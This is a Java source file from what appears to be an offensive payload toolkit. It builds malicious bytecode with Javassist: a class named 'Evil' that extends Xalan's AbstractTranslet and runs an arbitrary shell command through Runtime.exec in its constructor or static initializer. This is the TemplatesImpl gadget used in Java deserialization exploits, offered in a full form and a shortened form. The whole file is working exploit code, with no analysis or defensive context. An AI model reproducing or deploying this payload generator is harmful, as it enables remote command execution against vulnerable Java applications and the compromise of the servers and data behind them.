package cn.safe6.payload.shortPayload.payload;

import javassist.*;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

public class Generator {
    public static byte[] getTemplateImplBytes(String cmd) {
        return getShortTemplatesImpl(cmd);
    }

    public static void saveTemplateImpl(String path, String cmd) {
        try {
            Files.write(Paths.get(path), getShortTemplatesImpl(cmd));
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static byte[] getShortTemplatesImpl(String cmd) {
        try {
            ClassPool pool = ClassPool.getDefault();
            CtClass ctClass = pool.makeClass("Evil");
            CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
            ctClass.setSuperclass(superClass);
            CtConstructor constructor = CtNewConstructor.make("    public Evil(){\n" +
                    "        try {\n" +
                    "            Runtime.getRuntime().exec(\"" + cmd + "\");\n" +
                    "        }catch (Exception ignored){}\n" +
                    "    }", ctClass);
            ctClass.addConstructor(constructor);
            byte[] bytes = ctClass.toBytecode();
            ctClass.defrost();

            return bytes;
        } catch (Exception e) {
            e.printStackTrace();
            return new byte[]{};
        }
    }

    @SuppressWarnings("unused")
    private static byte[] getOriginTemplatesImpl(String cmd) {
        try {
            ClassPool pool = ClassPool.getDefault();
            CtClass ctClass = pool.makeClass("Evil");
            CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
            ctClass.setSuperclass(superClass);
            CtConstructor constructor = ctClass.makeClassInitializer();
            constructor.setBody("        try {\n" +
                    "            Runtime.getRuntime().exec(\"" + cmd + "\");\n" +
                    "        } catch (Exception ignored) {\n" +
                    "        }");
            CtMethod ctMethod1 = CtMethod.make("    public void transform(" +
                    "com.sun.org.apache.xalan.internal.xsltc.DOM document, " +
                    "com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) {\n" +
                    "    }", ctClass);
            ctClass.addMethod(ctMethod1);
            CtMethod ctMethod2 = CtMethod.make("    public void transform(" +
                    "com.sun.org.apache.xalan.internal.xsltc.DOM document, " +
                    "com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, " +
                    "com.sun.org.apache.xml.internal.serializer.SerializationHandler handler) {\n" +
                    "    }", ctClass);
            ctClass.addMethod(ctMethod2);
            byte[] bytes = ctClass.toBytecode();
            ctClass.defrost();
            return bytes;
        } catch (Exception e) {
            e.printStackTrace();
            return new byte[]{};
        }
    }
}
